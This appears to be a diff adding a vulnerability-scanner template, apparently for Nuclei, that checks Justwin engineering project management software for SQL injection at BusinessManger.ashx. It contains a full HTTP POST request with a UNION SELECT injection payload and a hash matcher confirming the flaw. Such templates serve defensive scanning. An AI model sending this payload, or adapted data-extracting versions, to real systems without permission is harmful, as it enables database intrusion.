@@ -1,0 +1,28 @@
+id: justwin-sql-injection
+info:
+  name: Justwin Engineering Project Management Software BusinessManger.ashx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Justwin engineering management software is a comprehensive multi-party collaboration platform suitable for engineering investment. There is a SQL injection vulnerability in the system, through which attackers can obtain database information, including high-privileged data.
+  reference:
+    - http://www.justwin.cn
+  tags:
+    - sql-injection
+http:
+  - raw:
+      - |
+        POST /AppInterface/Business/BusinessManger.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=PrjType&content=%' and 1=2 union select 1,(select SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123')),3,32));-- a
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+        part: body
